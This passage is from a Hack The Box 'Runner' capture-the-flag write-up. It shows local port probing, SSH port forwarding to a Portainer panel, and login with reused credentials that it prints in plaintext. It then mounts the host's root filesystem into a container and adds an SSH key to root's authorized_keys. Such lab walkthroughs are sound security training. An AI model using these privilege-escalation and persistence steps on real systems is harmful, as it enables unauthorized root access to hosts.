+To login manually go to "/login.html" page
+</code></pre>
+
+<p><strong>5005</strong></p>
+<pre><code class="language-bash">john@runner:~$ curl -i localhost:5005; echo
+curl: (52) Empty reply from server
+</code></pre>
+
+<p><strong>9443</strong></p>
+
+<pre><code class="language-http">john@runner:~$ curl -i -k https://localhost:9443
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Cache-Control: max-age=31536000
+Content-Length: 19130
+Content-Type: text/html; charset=utf-8
+Last-Modified: Thu, 07 Dec 2023 08:15:07 GMT
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 22 Aug 2024 07:11:07 GMT
+
+&lt;!doctype html&gt;&lt;html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"&gt;&lt;head&gt;&lt;meta charset="utf-8"/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name="description" content=""/&gt;&lt;meta name="author" content="Portainer.io"/&gt;&lt;meta http-equiv="cache-control" content="no-cache"/&gt;&lt;meta http-equiv="expires" content="0"/&gt;&lt;meta http-equiv="pragma" content="no-cache"/&gt;&lt;base id="base"/&gt;&lt;script&gt;if (window.origin == 'file://') {
+        // we are loading the app from a local file as in docker extension
+        document.getElementById('base').href = 'http://localhost:49000/';
+
+        window.ddExtension = true;
+      } else {
+        var path = window.location.pathname.replace(/^\/+|\/+$/g, '');
+        var basePath = path ? '/' + path + '/' : '/';
+        document.getElementById('base').href = basePath;
+      }&lt;/script&gt;&lt;!--[if lt IE 9]&gt;
+      &lt;script src="//html5shim.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt;
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p><strong>9000</strong></p>
+<pre><code class="language-http">john@runner:~$ curl -i localhost:9000
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Cache-Control: max-age=31536000
+Content-Length: 19130
+Content-Type: text/html; charset=utf-8
+Last-Modified: Thu, 07 Dec 2023 08:15:07 GMT
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 22 Aug 2024 07:12:35 GMT
+
+&lt;!doctype html&gt;&lt;html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"&gt;&lt;head&gt;&lt;meta charset="utf-8"/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name="description" content=""/&gt;&lt;meta name="author" content="Portainer.io"/&gt;&lt;meta http-equiv="cache-control" content="no-cache"/&gt;&lt;meta http-equiv="expires" content="0"/&gt;&lt;meta http-equiv="pragma" content="no-cache"/&gt;&lt;base id="base"/&gt;&lt;script&gt;if (window.origin == 'file://') {
+        // we are loading the app from a local file as in docker extension
+        document.getElementById('base').href = 'http://localhost:49000/';
+
+        window.ddExtension = true;
+      } else {
+        var path = window.location.pathname.replace(/^\/+|\/+$/g, '');
+        var basePath = path ? '/' + path + '/' : '/';
+        document.getElementById('base').href = basePath;
+      }&lt;/script&gt;&lt;!--[if lt IE 9]&gt;
+      &lt;script src="//html5shim.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>It seems like a portainer.io instance. Searching in google, its like a container manager:</p>
+
+<p><img src="/assets/images/Runner/what-is-portainer.io.png" alt="what is portainer.io"></p>
+
+<p>I will take advantage that I’m in a ssh shell to do a port forwarding of port 9000 of runner to be accessible by my port 9000:</p>
+
+<pre><code class="language-bash">❯ ssh -i id_rsa john@runner.htb -L 9000:127.0.0.1:9000
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+&lt;..SNIP..&gt;
+Last login: Thu Aug 22 07:06:16 2024 from 10.10.14.106
+john@runner:~$ 
+</code></pre>
+
+<p>Now its accessible in my machine:</p>
+
+<p><img src="/assets/images/Runner/portainer-accessible-in-my-machine.png" alt="portainer accessible in my machine"></p>
+
+<p>It asks me credentials so I will try the one I saw before in the teamcity’s database (matthew:piper123) and it works:</p>
+
+<p><img src="/assets/images/Runner/access-to-portainer.png" alt="access to portainer panel"></p>
+
+<p>I will do the same thing as ever with containers, create a volume to mount / and start a container with that volume to have access to all the host filesystem as root.</p>
+
+<p>First, I will create the volume:</p>
+
+<p><img src="/assets/images/Runner/volumes-button.png" alt="volumes button"></p>
+
+<p><img src="/assets/images/Runner/add-volume-button.png" alt="add volume button"></p>
+
+<p><img src="/assets/images/Runner/create-volume-options.png" alt="create volume options"></p>
+
+<p>Here I specified that the device to mount should be / (to mount the entire filesystem). Now I will create the container that uses this volume and mount it in /mnt:</p>
+
+<p><img src="/assets/images/Runner/containers-button.png" alt="containers button"></p>
+
+<p><img src="/assets/images/Runner/add-container-button.png" alt="add container button"></p>
+
+<p>Is here when I specify the volume:</p>
+
+<p><img src="/assets/images/Runner/container-settings.png" alt="container settings"></p>
+
+<p>When the container is deployed, start it and access the tty that the web offers:</p>
+
+<p><img src="/assets/images/Runner/access-container-console.png" alt="access container console"></p>
+
+<p>Specify the root user and click on connect:</p>
+
+<p><img src="/assets/images/Runner/connect-to-console.png" alt="connect to console"></p>
+
+<p>And I can see the root.txt:</p>
+
+<p><img src="/assets/images/Runner/root.txt-visible.png" alt="root.txt visible"></p>
+
+<p>If I wanted to gain access to the machine, I could copy my id_rsa.pub and introduce it in authorized keys:</p>
+
+<p><img src="/assets/images/Runner/introducing-pub-in-authorized_keys.png" alt="introducing pub in authorized_keys"></p>
+
+<p>Now I can access as root in runner:</p>
+
+<pre><code class="language-bash">❯ ssh root@10.10.11.13
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+&lt;..SNIP..&gt;
+
+
+Last login: Mon Apr 15 09:34:20 2024 from 10.10.14.52
+root@runner:~# ls -a
+.  ..  .bash_history  .bashrc  .cache  .docker  docker_clean.sh  initial_state.txt  .local  monitor.sh  .profile  root.txt  .ssh
+root@runner:~# whoami
+root
+root@runner:~# hostname -I
+10.10.11.13 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:f553 
+root@runner:~# hostname
+runner
+</code></pre>
+
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>24 August 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=teamcity" class="tag" style="font-family: 'Cascadia Code';">teamcity</a>
+    
+    <a href="/search?q=cve-2023-42793" class="tag" style="font-family: 'Cascadia Code';">cve-2023-42793</a>
+    
+    <a href="/search?q=teamcity-api" class="tag" style="font-family: 'Cascadia Code';">teamcity-api</a>
+    
+    <a href="/search?q=teamcity-rce" class="tag" style="font-family: 'Cascadia Code';">teamcity-rce</a>
+    
+    <a href="/search?q=hsql" class="tag" style="font-family: 'Cascadia Code';">hsql</a>
+    
+    <a href="/search?q=bcrypt" class="tag" style="font-family: 'Cascadia Code';">bcrypt</a>
+    
+    <a href="/search?q=hash-cracking" class="tag" style="font-family: 'Cascadia Code';">hash-cracking</a>
+    
+    <a href="/search?q=id_rsa" class="tag" style="font-family: 'Cascadia Code';">id_rsa</a>
+    
+    <a href="/search?q=portainer" class="tag" style="font-family: 'Cascadia Code';">portainer</a>
+    
+    
+</div>
+  <br>
+  Share this writeup: 
+  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Runner.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Runner.html&amp;text=Writeup+for+HTB%20Runner%20writeup+from+HTB+held+on+24%20August%202024&amp;hashtags=ctf,writeup,Runner,HTB,teamcity,cve-2023-42793,teamcity-api,teamcity-rce,hsql,bcrypt,hash-cracking,id_rsa,portainer','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Runner.html&amp;text=Writeup+for+HTB%20Runner%20writeup+from+HTB+held+on+2024-08-24%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
